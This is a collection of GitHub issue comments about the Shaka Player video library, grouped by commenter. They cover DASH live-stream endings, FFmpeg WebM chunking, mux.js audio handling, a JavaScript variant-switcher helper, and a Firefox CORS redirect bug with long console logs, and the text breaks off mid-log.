    "garfieldjty": "@ryancl01 We are facing the same issue now with Chrome and Firefox. Is there any news about this issue?. ",
    "ncahoon": "It all depends on when a person joins the stream and what our customer has configured. If the event has not begun, and the event URL has been published, users will get a live stream of repeating \"pre-event slate\". If they join while the stream is \"live\" they will get the live linear stream. If they join the event after it's over and the customer has chosen VOD replayable on the event, they will get a VOD manifest. If they watch the event to the end, then customer can specify how long they want \"post-event slate to play\". We have been successfully doing this with HLS for some time. We are working on getting this same feature developed in DASH. I can setup a test stream for you where it \"ends\" after ~2 minutes if that would help. I believe it's a different use case than the bug you mentioned. I saw that one, and decided mine was different.. @TheModMaker would you like me to publish a sample stream for you to see?. @TheModMaker I've created the ability for you to create this scenario on a live stream on our platform. https://content.uplynk.com/channel/3ff06a21737f40bd9f0e3bc342a4ca6b.mpd?xtest=end30&prettydash=1 The first parameter on the URL tells the stream to end in 30 seconds, the second parameter formats the manifest XML to be easier on the eyes. We are removing the minimumUpdatePeriod and adding the mediaPresentationDuration for the stream to end. I'm working with the our internal player teams to support this and the folks at BitMovin. Let me know if this works for you.. ",
    "FeliceGeracitano": "Hi @chrisfillmore \nThanks for the bugs links.\nI see your point now. Configuration object will have no effect since safari will handle the streaming. \nI'l be Happy to help on #997 if is needed.\nRelated to the separate implementations, could that lead to shaka.SafariPlayer for com.apple.fps.1_0 and shaka.Player for com.apple.fps.2_0?\n. @joeyparrish Ok make sense. Thanks for your work on the shaka-player. ",
    "PrasannaLearnyst": "Hi @ismena,\nThank you for the response.\nI have checked with chrome (Android) native player, its playing the video.\nCan you please advice on this?. @ismena ,\nIt will be helpful, thanks. @ismena @joeyparrish \nHi, \nThe mux people have replied with the below, can you please guide how to proceed?\n\nIt looks like the 3rd segment does not contain any audio data, but the PMT says there is an audio track. Because of this code here https://github.com/videojs/mux.js/blob/master/lib/mp4/transmuxer.js#L1110 the transmuxer is waiting for audio data that is never coming.\nYou should be able to fix this by setting the remux option to false for the transmuxer.\njs\n  this.muxTransmuxer_ = new muxjs.mp4.Transmuxer({\n    'keepOriginalTimestamps': true,\n    'remux': false\n  });\nNote that this will result in separate data events for audio and video, which may require other code changes within Shaka.. @ismena the content works fine with chrome native HLS player and also in other players I checked online. I will check with my encoder also, but I think it is also good to fix in shaka player. @joeyparrish , thank you. Looking forward for the fix. ",
    "ravics78": "segmentincorrect-5.log\nattached logs showing the above warning message. More details about the issue:\nAlthough the playback is not halted due to the warnings, logs get accumulated due to excessive warning statements which can slow down the system\n. ",
    "Cowboy-coder": "Thanks for that response. Makes stuffs a lot clearer!\nI guess I got confused also because seems player.getTextTracks() always seems to return a active == true track. So I thought perhaps I'm responsible for deactivating that track, but then now I saw this piece of code. But I did notice like you said that if I turned off subtitles by calling player.setTextTrackVisibility(false) then they were no longer streamed.. ",
    "desenhista": "Hi @ismena \nhas restriction by region. sorry for that.\nI will remove the restriction and as soon as I can, I'll let you know\nthank you so much. Hi @ismena\nCan you give me an ip or range of ip to put on the white list of akamai?\nThanks. Hi @ismena \nThe ips were placed on the white list\nThanks. Hi @joeyparrish \nPlease, can you try again?\nthank you very much. ",
    "yairtal": "I've tried the offline option, it will only download the lowest quality possible, no matter what's my bandwidth. Any way to configure that? Have it check the bandwidth before the download starts?\nI've also tried to set bufferBehind and bufferingGoal values to the length of the video, the result was still a streaming download on every loop, it doesn't just download once.\nI have a 73 secs long marketing video that is in 4K quality, it's auto played and looped.. https://arctop.co\nMy video duration is 00:01:12.15 and my configuration is:\nplayer.configure({\n        streaming: {\n          bufferBehind: 72.15,\n          bufferingGoal: 72.15,\n        },\n      });\nI've made sure I am not loading the video more than once. \nhtml is set for loop with <video loop>\nyet, it's downloading the entire video on each loop.. Thank you for your fast reply and work-around. ",
    "NathanSass": "Any updates on this? I would also like this for chaptering.. ",
    "philippk80": "I try to explain it. \nI want to provide the video with multiple quality profiles like youtube, netflix, ... ( I think that is the most common requirement) Now is the problem that I have to keep the needed disk space as low as possible.\nBecause of this I thought about saving only the file with the best quality. This should allow me to make something like a realtime rendering when someone requests some media. Maybe it should be said that there won't be as much clients as netflix and youtube must handle. (Maybe something between 1 to 5)\nI thought about building a HTTP interface which provides for example following endpoints and will be included in the manifest:\nhttp://server.com/player/{mediaId}-4k.webm\nhttp://server.com/player/{mediaId}-1080p.webm\nhttp://server.com/player/{mediaId}-720p.webm\nhttp://server.com/player/{mediaId}-480p.webm\nBut only the 4k one exists physically on the disk. So the others will be rendered partially when the client requests a chunk. \nSo the player should be able to switch between the resolutions and I don't have to safe all version of the video. \nIs this too optimistic because of performance or is this possible?\n(I thought about serving the api with .net core that hosts a background service which handles the encoding per command line calls and ffmpeg). Yesterday I tryed to make a performance test with VP9 and a desktop pc. The results won't let me go with this approach even on 720p for performance reasons. I don't know if I would get better results if using another codec. . ",
    "madsva": "No problems :-)\nI've requested an public clear stream that does not time out from the customer. I will get back regarding this. One note: I've tried to modify the availabilityStartTime through a proxy to now() (instead of 1970...) and it actually started playback, though with a lot of jitter/hick-ups (or whatever you would call it).\nI'll get back as soon as I've got a stream available.\nThanks.. I've sent a mail with a public clear stream.. Thank you - much appreciated!\nWe'll try to adjust the manifest based on your finding and recommendations.\nOne last thing: what about the UTCTiming element (this is missing as well) - is this recommended practise to add this or is it okay to leave out?. All right - we'll make sure the UTCTiming element is added as well.\nRegarding the timeShiftBufferDepth - what is the recommended size for this value?. ",
    "Tilakv": "xml version=\"1.0\" encoding=\"UTF-8\"?\n\n\n\n\n\n\n\n\n. The command below is for creating chunks:\n/home/user/bin/ffmpeg -f rawvideo -vcodec rawvideo -pix_fmt bgr24 -video_size 512x512 -threads 1 -probesize 32 -r 100 -i /home/user/raw_render/src/image_out -map 0 -vcodec libvpx  -b:v 5000k -keyint_min 60 -g 60 -f webm_chunk -header /var/www/html/tea_pot_360.hdr -chunk_start_index 1 -chunk_duration_ms 10000 /var/www/html/tea_pot_360_%d.chk\nThe following is for creating manifest file:\n/home/user/bin/ffmpeg -f webm_dash_manifest -live 1 -i /var/www/html/tea_pot_360.hdr -vcodec libvpx  -map 0 -f webm_dash_manifest -live 1 -adaptation_sets \"id=0,streams=v\" -chunk_start_index 1 -chunk_duration_ms 10000  /var/www/html/tea_pot_live_manifest.mpd\n. I could not send the files via e-mail due to mail server blocking the content.  . I am using the local host and I dont have a URI for the manifest file,\ninstead have a local path. However, I have updated the thread with the\nattachments of the manifest file, and ffmpeg commands.\nThanks,\nTilak\n2018-06-19 23:08 GMT+02:00 Jacob Trimble notifications@github.com:\n\nCan you please provide an example manifest URL that reproduces your\nproblem? You can send it privately to shaka-player-issues@google.com if\nyou prefer. We may also be able to work with an example FFmpeg command, but\nit would be preferable to have the manifest URL (and please send a URL, not\nthe manifest text, we need to be able to play the content).\nMy guess is FFmpeg is converting a static image to a video stream and that\nis what we are playing. What you may want to try is having FFmpeg output a\nstatic file instead to verify it is generating the video you want. You may\nget more help on the FFmpeg mailing list (ffmpeg-user@ffmpeg.org). If I\nrun the following command, I can play the manifest fine.\nffmpeg -i sintel.mp4 -c copy -f dash manifest.mpd\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/google/shaka-player/issues/1467#issuecomment-398546589,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AAyj_imHEm0KVaJKLu8f-FiatH3XUMHPks5t-WhngaJpZM4UtYrz\n.\n. Yes, the video my_video.webm is a still image. The render software is fed with the mouse coordinates, and the new image is created by the render software, but the client plays only a still image. I still need to check if ffmpeg makes a webm video with the images fetched from the renderer. \n\nI had a working prototype with the real time streaming of the interactive streaming, where the server streams the new images in the form of webm file, with ffserver, ffmpeg, and played by HTML5 video tag. \nWhereas in the DASH implementation, ffserver is not used, and the details like Port number and video file location are not transparent. Apparently, in case of  MP4, the MPD structure is different than webm,  . /home/user/bin/ffmpeg -f rawvideo -vcodec rawvideo -pix_fmt bgr24 -video_size 512x512 -threads 1 -probesize 32 -r 100 -i /home/user/raw_render/src/image_out -map 0 -vcodec libvpx  -b:v 5000k -f webm output.webm \nThe above command creates the video with the new   mouse co-ordinates\noutput.webm.zip\n. When I cat the .hdr video and the .chk file, the output video contains new images. The client however does not play the cumulative chunks. This means that fffmeg reads the new images from the pipe and updates them. \nFor eg:       cat tea_pot_360.hdr tea_pot_360_*.chk   | ffplay -   \nThis plays the video with new images. I am not sure how shaka player interprets the chunks. Does it cumulatively play all the chunks in order with/after a certain timestamp value?. I have done some tests and have identified the following:\nThe issue is with the chunk size and duration. FFMPEG creates a webm chunk of size equal to the GOP, and each chunk starts with a Key frame. To reduce the delay, I used a GOP of 1, and this creates chunk for every frame. For, 60 fps, 60 chunks are created per second, and respectively 30 chunks for 30 fps. \nThere is a delay of at-least one chunk ( 1 GOP size ). Which means, a GOP of 120 leads to 4 seconds of delay for 30 fps. The Manifest file loads the chunks periodically at a lower frequency(Approximately each chunk every 2 seconds?). I don't know if this can be configured on the Shaka player ? \nIn a real time streaming scenario, there is initially a delay of 1 GOP and if there are more chunks created than it can be loaded by the player, the current stream lags by several frames. \nThe question is if the Shaka player can be loaded or configured to retrieve the next chunks as soon as it is created? I played a bit with the \"minimumUpdatePeriod\" interval, but I could not notice any difference in the frequency chunks are loaded. Instead, the Manifest file is updated more regularly. \nIf the GOP is approximately 3 to 4 seconds, then the client loads the next chunks as soon as it is created, otherwise the client player is lagging. \nThanks! . @shaka-bot  reopen : Thanks for the suggestions! Sorry for the delay to respond. I have tested some settings which are tagged in the previous comments like large minimumupdate_period set to 7200 sec.. I added the element  suggestedPresentationDelay by tweaking the ffmeg source code (hardcoded to zero), as the option is not available to set in ffmpeg command. \nI have set a GOP of 1 sec and a bit more (34 for 30 fps). I have noticed the following:\nSometimes the live session hangs at roughly about downloading 80 chunks. In the beginning of the session, when the client starts, the chunks are requested fast and in synchronization with the generation rate at the server. After playing roughly 40 chunks, the client starts to lag with the server side and the difference can go up to 20-30 chunks depending on the duration of the session. For eg. at time T+80th chunk at the server, the client plays T+60th Chunk. \nIs this a common phenomenon in case of live streaming? \nThanks,\nTilak . ",
    "AdrienKourga": "Thanks for answering that quickly !\nDoes it means that if we use the offline api to download a protected content, shaka player will figure out that this content is protected and will send a license request to our license server ? (using the server urls we provide with player.configure() ?)\nAnd if so, just out of curiousity, how does shaka player gets a challenge to retrieve a license without actually trying to play the content ?. ",
    "parmendratyagi": "@shaka-bot Yes, it answered my question.\nIs there any way to get a notification on lunch of this feature.?. @ismena No, I am not. How can I subscribe?. ",
    "greenya": "Hello.\nI wrote function that adds variant switcher.\nI use it for my development, maybe it can help you.\n```javascript\nfunction attachVariantSwitcherToShakaPlayer (player, elementToInsertAfter) {\n    var select = document.createElement('select')\n    select.style.float = 'right'\nelementToInsertAfter.parentElement.insertBefore(select, elementToInsertAfter.nextSibling)\n\nvar addOption = (text, variantId) => {\n    var o = document.createElement('option')\n    o.text = text\n    if (variantId) {\n        o.dataset.variantId = variantId\n    }\n    select.add(o)\n}\n\nplayer.addEventListener('trackschanged', () => {\n    while (select.options.length) {\n        select.remove(0)\n    }\n\n    addOption('Auto')\n    player.getVariantTracks().forEach(e => {\n        var name = []\n\n        if (e.height) {\n            name.push(e.height + 'p')\n        }\n\n        if (e.bandwidth) {\n            name.push(Math.round(e.bandwidth / 1000) + 'k')\n        }\n\n        if (e.label) {\n            name.push(e.label)\n        } else if (e.language) {\n            name.push(e.language)\n        }\n\n        if (name.length === 0) {\n            name.push('Variant ID ' + e.id)\n        }\n\n        addOption(name.join(' - '), e.id)\n    })\n})\n\nplayer.addEventListener('adaptation', () => {\n    var variantId = player.getVariantTracks().find(i => i.active).id\n    var curr = select.querySelector('option[data-variant-id=\"' + variantId + '\"]')\n    var auto = select.querySelector('option:not([data-variant-id])')\n    auto.text = curr ? curr.text + ' - Auto' : 'Auto'\n})\n\nselect.addEventListener('change', () => {\n    var variantId = select.selectedOptions[ 0 ].dataset.variantId\n    if (variantId) {\n        var variant = player.getVariantTracks().find(i => i.id == variantId)\n        player.configure({ abr: { enabled: false } })\n        player.selectVariantTrack(variant, true)\n        var auto = select.querySelector('option:not([data-variant-id])')\n        auto.text = 'Auto'\n    } else {\n        player.configure({ abr: { enabled: true } })\n    }\n})\n\n}\n```\nTo check it out, you just:\n- go to https://shaka-player-demo.appspot.com/demo/\n- open browser console\n- execute all code above (which is a function definition)\n- execute oneliner below (which will call defined function for the player at the Demo page)\nattachVariantSwitcherToShakaPlayer(shakaDemo.localPlayer_, document.getElementById('videoContainer'))\n. Good to know. Thank you.. Thank you.\nIts better now (playing starts much faster).. ",
    "KameshDevarakonda": "Please correct me if I am wrong but the bug you linked to specifies that redirects are not followed if it requires preflight request.\nThe workflow I described in the doc seems to point to \"simple\" CORS requests (that don't require preflight). \nApart from that as I documented in the doc, Firefox and Dash.js combination works flawless. Also Shaka Player works flawlessly in the older version of Firefox (52 ESR).. I can still reproduce the issue. Did you clear the cache before running the test?\nRegarding second point, when I used the dash.js player \"the origin request header is being set as null in the redirect\"\n\n\n. Yep.. I can see exact same message : A ServiceWorker passed a promise to FetchEvent.respondWith() that rejected with \u2018TypeError: NetworkError when attempting to fetch resource.\u2019.\n`16:06:09.503 Unload latency: 0.015 player.js:706:5\n16:06:09.604 notifySegments: maxSegmentDuration=10.00780045351474\npresentation_timeline.js:192:3\n16:06:09.626 notifyNewSegmentDuration: maxSegmentDuration=10.00780045351474 presentation_timeline.js:212:3\n16:06:09.626 Found variant with audio and video content, so filtering all periods. player.js:607:5\n16:06:09.628 codecs avc1-mp4a avg bandwidth 10607967.42857143 player.js:900:5\n16:06:09.629 onChooseStreams_ \nObject { startTime: 0, textStreams: [], variants: (1) [\u2026] }\nplayer.js:2839:3\n16:06:09.630 Choosing new streams after period changed player.js:2851:3\n16:06:09.631 onChooseStreams_, variants and text streams:\nArray [ {\u2026} ]\nArray []\nplayer.js:2871:3\n16:06:09.632 Bandwidth ranges: 3.411 3.591 Infinity simple_abr_manager.js:142:5\n16:06:09.632 onChooseStreams_, chosen= \nObject { id: 3, language: \"und\", primary: false, audio: {\u2026}, video: {\u2026}, bandwidth: 3411000, drmInfos: [], allowedByApplication: true, allowedByKeySystem: true }\n null player.js:2877:3\n16:06:09.635 (all) setting up Stream 1 streaming_engine.js:1018:7\n16:06:09.635 (all) setting up Stream 2 streaming_engine.js:1018:7\n16:06:09.635 (all) setup Stream 1 streaming_engine.js:1036:9\n16:06:09.635 (all) setup Stream 2 streaming_engine.js:1036:9\n16:06:09.636 (audio:1) updating in 0 seconds streaming_engine.js:2205:3\n16:06:09.636 (video:2) updating in 0 seconds streaming_engine.js:2205:3\n16:06:09.636 init: completed initial Stream setup streaming_engine.js:423:5\n16:06:09.641 (audio:1) timeNeeded=0 streaming_engine.js:1160:3\n16:06:09.642 (audio:1) update_: playheadTime=0 bufferedAhead=0 streaming_engine.js:1171:3\n16:06:09.642 (audio:1) next position unknown: nothing buffered streaming_engine.js:1346:5\n16:06:09.642 (audio:1) looking up segment: presentationTime=0 currentPeriod.startTime=0 streaming_engine.js:1387:3\n16:06:09.642 (audio:1) segment does not exist: currentPeriod.startTime=0 position=0 streaming_engine.js:1423:5\n16:06:09.643 (audio:1) fetchAndAppend_: playheadTime=0 currentPeriod.startTime=0 reference.position=1 reference.startTime=0 reference.endTime=10.00780045351474 streaming_engine.js:1467:3\n16:06:09.643 (audio:1) setting timestamp offset to 0 streaming_engine.js:1690:3\n16:06:09.643 (audio:1) setting appstart window start to 0 streaming_engine.js:1691:3\n16:06:09.643 (audio:1) setting append window end to 30.093 streaming_engine.js:1693:3\n16:06:09.644 (audio:1) fetching init segment streaming_engine.js:1703:3\n16:06:09.645 fetching: reference=[object Object] streaming_engine.js:2150:3\n16:06:09.645 (audio:1) fetching segment streaming_engine.js:1503:3\n16:06:09.649 fetching: reference=[object Object] streaming_engine.js:2150:3\n16:06:09.654 (video:2) timeNeeded=0 streaming_engine.js:1160:3\n16:06:09.654 (video:2) update_: playheadTime=0 bufferedAhead=0 streaming_engine.js:1171:3\n16:06:09.654 (video:2) next position unknown: nothing buffered streaming_engine.js:1346:5\n16:06:09.655 (video:2) looking up segment: presentationTime=0 currentPeriod.startTime=0 streaming_engine.js:1387:3\n16:06:09.655 (video:2) segment does not exist: currentPeriod.startTime=0 position=0 streaming_engine.js:1423:5\n16:06:09.655 (video:2) fetchAndAppend_: playheadTime=0 currentPeriod.startTime=0 reference.position=1 reference.startTime=0 reference.endTime=5.005 streaming_engine.js:1467:3\n16:06:09.656 (video:2) setting timestamp offset to 0 streaming_engine.js:1690:3\n16:06:09.656 (video:2) setting appstart window start to 0 streaming_engine.js:1691:3\n16:06:09.656 (video:2) setting append window end to 30.093 streaming_engine.js:1693:3\n16:06:09.657 (video:2) fetching init segment streaming_engine.js:1703:3\n16:06:09.657 fetching: reference=[object Object] streaming_engine.js:2150:3\n16:06:09.657 (video:2) fetching segment streaming_engine.js:1503:3\n16:06:09.658 fetching: reference=[object Object] streaming_engine.js:2150:3\n16:06:09.976 Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at https://truman-nightly.sandbox.google.com/segments/redirect/c/init.mp4?orig=https%3A%2F%2Fr2---atl14s48.googlevideo.com%2Fvideoplayback%3Fid%3Df773b756f6a4ed78%26itag%3D340%26source%3Ddclk_video_ads%26ctier%3DL%26clen%3D478945%26mime%3Daudio%2Fmp4%26xtags%3Dac%3Daac%3Aach%3D2%3Aasr%3D44100%3Aatbr%3D128%26cmbypass%3Dyes%26ratebypass%3Dyes%26acao%3Dyes%26gir%3Dyes%26lmt%3D1532061054141045%26ip%3D0.0.0.0%26ipbits%3D0%26expire%3D1532721898%26sparams%3Dip%2Cipbits%2Cexpire%2Cid%2Citag%2Csource%2Cctier%2Cclen%2Cmime%2Cxtags%2Ccmbypass%2Cratebypass%2Cacao%2Cgir%2Clmt%26signature%3D5350291D739FFA03F114F99B70C0709439249583.103BC4499B0D879A7611EE7B350D50C314EB0E1A%26key%3Dck2. (Reason: CORS request did not succeed).\n16:06:09.976 Failed to load \u2018https://truman-nightly.sandbox.google.com/segments/redirect/c/init.mp4?orig=https%3A%2F%2Fr2---atl14s48.googlevideo.com%2Fvideoplayback%3Fid%3Df773b756f6a4ed78%26itag%3D340%26source%3Ddclk_video_ads%26ctier%3DL%26clen%3D478945%26mime%3Daudio%2Fmp4%26xtags%3Dac%3Daac%3Aach%3D2%3Aasr%3D44100%3Aatbr%3D128%26cmbypass%3Dyes%26ratebypass%3Dyes%26acao%3Dyes%26gir%3Dyes%26lmt%3D1532061054141045%26ip%3D0.0.0.0%26ipbits%3D0%26expire%3D1532721898%26sparams%3Dip%2Cipbits%2Cexpire%2Cid%2Citag%2Csource%2Cctier%2Cclen%2Cmime%2Cxtags%2Ccmbypass%2Cratebypass%2Cacao%2Cgir%2Clmt%26signature%3D5350291D739FFA03F114F99B70C0709439249583.103BC4499B0D879A7611EE7B350D50C314EB0E1A%26key%3Dck2\u2019. A ServiceWorker passed a promise to FetchEvent.respondWith() that rejected with \u2018TypeError: NetworkError when attempting to fetch resource.\u2019.\n16:06:09.988 Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at https://truman-nightly.sandbox.google.com/segments/redirect/c/init.mp4?orig=https%3A%2F%2Fr2---atl14s48.googlevideo.com%2Fvideoplayback%3Fid%3Df773b756f6a4ed78%26itag%3D340%26source%3Ddclk_video_ads%26cmbypass%3Dyes%26ratebypass%3Dyes%26gir%3Dyes%26clen%3D12328325%26acao%3Dyes%26ctier%3DL%26lmt%3D1532061116278872%26mime%3Dvideo%2Fmp4%26xtags%3Dvc%3Davc%3Avccf%3Dmain%3Avsz%3D1920x1080%3Avtbr%3D4400%26ip%3D0.0.0.0%26ipbits%3D0%26expire%3D1532721898%26sparams%3Dip%2Cipbits%2Cexpire%2Cid%2Citag%2Csource%2Ccmbypass%2Cratebypass%2Cgir%2Cclen%2Cacao%2Cctier%2Clmt%2Cmime%2Cxtags%26signature%3D1A8F5A22887555328AC1D2E1FB872CC11CE48479.5448645BCC34CB63753060DF1DE782F7C4017009%26key%3Dck2. (Reason: CORS request did not succeed).\n16:06:09.988 Failed to load \u2018https://truman-nightly.sandbox.google.com/segments/redirect/c/init.mp4?orig=https%3A%2F%2Fr2---atl14s48.googlevideo.com%2Fvideoplayback%3Fid%3Df773b756f6a4ed78%26itag%3D340%26source%3Ddclk_video_ads%26cmbypass%3Dyes%26ratebypass%3Dyes%26gir%3Dyes%26clen%3D12328325%26acao%3Dyes%26ctier%3DL%26lmt%3D1532061116278872%26mime%3Dvideo%2Fmp4%26xtags%3Dvc%3Davc%3Avccf%3Dmain%3Avsz%3D1920x1080%3Avtbr%3D4400%26ip%3D0.0.0.0%26ipbits%3D0%26expire%3D1532721898%26sparams%3Dip%2Cipbits%2Cexpire%2Cid%2Citag%2Csource%2Ccmbypass%2Cratebypass%2Cgir%2Cclen%2Cacao%2Cctier%2Clmt%2Cmime%2Cxtags%26signature%3D1A8F5A22887555328AC1D2E1FB872CC11CE48479.5448645BCC34CB63753060DF1DE782F7C4017009%26key%3Dck2\u2019. A ServiceWorker passed a promise to FetchEvent.respondWith() that rejected with \u2018TypeError: NetworkError when attempting to fetch resource.\u2019.\n16:06:09.998 Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at https://truman-nightly.sandbox.google.com/segments/redirect/c/1.mp4?orig=https%3A%2F%2Fr2---atl14s48.googlevideo.com%2Fvideoplayback%3Fid%3Df773b756f6a4ed78%26itag%3D340%26source%3Ddclk_video_ads%26cmbypass%3Dyes%26ratebypass%3Dyes%26gir%3Dyes%26clen%3D12328325%26acao%3Dyes%26ctier%3DL%26lmt%3D1532061116278872%26mime%3Dvideo%2Fmp4%26xtags%3Dvc%3Davc%3Avccf%3Dmain%3Avsz%3D1920x1080%3Avtbr%3D4400%26ip%3D0.0.0.0%26ipbits%3D0%26expire%3D1532721898%26sparams%3Dip%2Cipbits%2Cexpire%2Cid%2Citag%2Csource%2Ccmbypass%2Cratebypass%2Cgir%2Cclen%2Cacao%2Cctier%2Clmt%2Cmime%2Cxtags%26signature%3D1A8F5A22887555328AC1D2E1FB872CC11CE48479.5448645BCC34CB63753060DF1DE782F7C4017009%26key%3Dck2. (Reason: CORS request did not succeed).\n16:06:09.998 Failed to load \u2018https://truman-nightly.sandbox.google.com/segments/redirect/c/1.mp4?orig=https%3A%2F%2Fr2---atl14s48.googlevideo.com%2Fvideoplayback%3Fid%3Df773b756f6a4ed78%26itag%3D340%26source%3Ddclk_video_ads%26cmbypass%3Dyes%26ratebypass%3Dyes%26gir%3Dyes%26clen%3D12328325%26acao%3Dyes%26ctier%3DL%26lmt%3D1532061116278872%26mime%3Dvideo%2Fmp4%26xtags%3Dvc%3Davc%3Avccf%3Dmain%3Avsz%3D1920x1080%3Avtbr%3D4400%26ip%3D0.0.0.0%26ipbits%3D0%26expire%3D1532721898%26sparams%3Dip%2Cipbits%2Cexpire%2Cid%2Citag%2Csource%2Ccmbypass%2Cratebypass%2Cgir%2Cclen%2Cacao%2Cctier%2Clmt%2Cmime%2Cxtags%26signature%3D1A8F5A22887555328AC1D2E1FB872CC11CE48479.5448645BCC34CB63753060DF1DE782F7C4017009%26key%3Dck2\u2019. A ServiceWorker passed a promise to FetchEvent.respondWith() that rejected with \u2018TypeError: NetworkError when attempting to fetch resource.\u2019.\n16:06:10.012 Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at https://truman-nightly.sandbox.google.com/segments/redirect/c/1.mp4?orig=https%3A%2F%2Fr2---atl14s48.googlevideo.com%2Fvideoplayback%3Fid%3Df773b756f6a4ed78%26itag%3D340%26source%3Ddclk_video_ads%26ctier%3DL%26clen%3D478945%26mime%3Daudio%2Fmp4%26xtags%3Dac%3Daac%3Aach%3D2%3Aasr%3D44100%3Aatbr%3D128%26cmbypass%3Dyes%26ratebypass%3Dyes%26acao%3Dyes%26gir%3Dyes%26lmt%3D1532061054141045%26ip%3D0.0.0.0%26ipbits%3D0%26expire%3D1532721898%26sparams%3Dip%2Cipbits%2Cexpire%2Cid%2Citag%2Csource%2Cctier%2Cclen%2Cmime%2Cxtags%2Ccmbypass%2Cratebypass%2Cacao%2Cgir%2Clmt%26signature%3D5350291D739FFA03F114F99B70C0709439249583.103BC4499B0D879A7611EE7B350D50C314EB0E1A%26key%3Dck2. (Reason: CORS request did not succeed).\n16:06:10.012 Failed to load \u2018https://truman-nightly.sandbox.google.com/segments/redirect/c/1.mp4?orig=https%3A%2F%2Fr2---atl14s48.googlevideo.com%2Fvideoplayback%3Fid%3Df773b756f6a4ed78%26itag%3D340%26source%3Ddclk_video_ads%26ctier%3DL%26clen%3D478945%26mime%3Daudio%2Fmp4%26xtags%3Dac%3Daac%3Aach%3D2%3Aasr%3D44100%3Aatbr%3D128%26cmbypass%3Dyes%26ratebypass%3Dyes%26acao%3Dyes%26gir%3Dyes%26lmt%3D1532061054141045%26ip%3D0.0.0.0%26ipbits%3D0%26expire%3D1532721898%26sparams%3Dip%2Cipbits%2Cexpire%2Cid%2Citag%2Csource%2Cctier%2Cclen%2Cmime%2Cxtags%2Ccmbypass%2Cratebypass%2Cacao%2Cgir%2Clmt%26signature%3D5350291D739FFA03F114F99B70C0709439249583.103BC4499B0D879A7611EE7B350D50C314EB0E1A%26key%3Dck2\u2019. A ServiceWorker passed a promise to FetchEvent.respondWith() that rejected with \u2018TypeError: NetworkError when attempting to fetch resource.\u2019.\n16:06:10.608 (audio:1) failed fetch and append: code=1002 streaming_engine.js:1554:7\n16:06:10.607 Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at https://truman-nightly.sandbox.google.com/segments/redirect/c/init.mp4?orig=https%3A%2F%2Fr2---atl14s48.googlevideo.com%2Fvideoplayback%3Fid%3Df773b756f6a4ed78%26itag%3D340%26source%3Ddclk_video_ads%26ctier%3DL%26clen%3D478945%26mime%3Daudio%2Fmp4%26xtags%3Dac%3Daac%3Aach%3D2%3Aasr%3D44100%3Aatbr%3D128%26cmbypass%3Dyes%26ratebypass%3Dyes%26acao%3Dyes%26gir%3Dyes%26lmt%3D1532061054141045%26ip%3D0.0.0.0%26ipbits%3D0%26expire%3D1532721898%26sparams%3Dip%2Cipbits%2Cexpire%2Cid%2Citag%2Csource%2Cctier%2Cclen%2Cmime%2Cxtags%2Ccmbypass%2Cratebypass%2Cacao%2Cgir%2Clmt%26signature%3D5350291D739FFA03F114F99B70C0709439249583.103BC4499B0D879A7611EE7B350D50C314EB0E1A%26key%3Dck2. (Reason: CORS request did not succeed).\n16:06:10.607 Failed to load \u2018https://truman-nightly.sandbox.google.com/segments/redirect/c/init.mp4?orig=https%3A%2F%2Fr2---atl14s48.googlevideo.com%2Fvideoplayback%3Fid%3Df773b756f6a4ed78%26itag%3D340%26source%3Ddclk_video_ads%26ctier%3DL%26clen%3D478945%26mime%3Daudio%2Fmp4%26xtags%3Dac%3Daac%3Aach%3D2%3Aasr%3D44100%3Aatbr%3D128%26cmbypass%3Dyes%26ratebypass%3Dyes%26acao%3Dyes%26gir%3Dyes%26lmt%3D1532061054141045%26ip%3D0.0.0.0%26ipbits%3D0%26expire%3D1532721898%26sparams%3Dip%2Cipbits%2Cexpire%2Cid%2Citag%2Csource%2Cctier%2Cclen%2Cmime%2Cxtags%2Ccmbypass%2Cratebypass%2Cacao%2Cgir%2Clmt%26signature%3D5350291D739FFA03F114F99B70C0709439249583.103BC4499B0D879A7611EE7B350D50C314EB0E1A%26key%3Dck2\u2019. A ServiceWorker passed a promise to FetchEvent.respondWith() that rejected with \u2018TypeError: NetworkError when attempting to fetch resource.\u2019.\n16:06:10.736 (video:2) failed fetch and append: code=1002 streaming_engine.js:1554:7\n16:06:10.735 Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at https://truman-nightly.sandbox.google.com/segments/redirect/c/init.mp4?orig=https%3A%2F%2Fr2---atl14s48.googlevideo.com%2Fvideoplayback%3Fid%3Df773b756f6a4ed78%26itag%3D340%26source%3Ddclk_video_ads%26cmbypass%3Dyes%26ratebypass%3Dyes%26gir%3Dyes%26clen%3D12328325%26acao%3Dyes%26ctier%3DL%26lmt%3D1532061116278872%26mime%3Dvideo%2Fmp4%26xtags%3Dvc%3Davc%3Avccf%3Dmain%3Avsz%3D1920x1080%3Avtbr%3D4400%26ip%3D0.0.0.0%26ipbits%3D0%26expire%3D1532721898%26sparams%3Dip%2Cipbits%2Cexpire%2Cid%2Citag%2Csource%2Ccmbypass%2Cratebypass%2Cgir%2Cclen%2Cacao%2Cctier%2Clmt%2Cmime%2Cxtags%26signature%3D1A8F5A22887555328AC1D2E1FB872CC11CE48479.5448645BCC34CB63753060DF1DE782F7C4017009%26key%3Dck2. (Reason: CORS request did not succeed).\n16:06:10.735 Failed to load \u2018https://truman-nightly.sandbox.google.com/segments/redirect/c/init.mp4?orig=https%3A%2F%2Fr2---atl14s48.googlevideo.com%2Fvideoplayback%3Fid%3Df773b756f6a4ed78%26itag%3D340%26source%3Ddclk_video_ads%26cmbypass%3Dyes%26ratebypass%3Dyes%26gir%3Dyes%26clen%3D12328325%26acao%3Dyes%26ctier%3DL%26lmt%3D1532061116278872%26mime%3Dvideo%2Fmp4%26xtags%3Dvc%3Davc%3Avccf%3Dmain%3Avsz%3D1920x1080%3Avtbr%3D4400%26ip%3D0.0.0.0%26ipbits%3D0%26expire%3D1532721898%26sparams%3Dip%2Cipbits%2Cexpire%2Cid%2Citag%2Csource%2Ccmbypass%2Cratebypass%2Cgir%2Cclen%2Cacao%2Cctier%2Clmt%2Cmime%2Cxtags%26signature%3D1A8F5A22887555328AC1D2E1FB872CC11CE48479.5448645BCC34CB63753060DF1DE782F7C4017009%26key%3Dck2\u2019. A 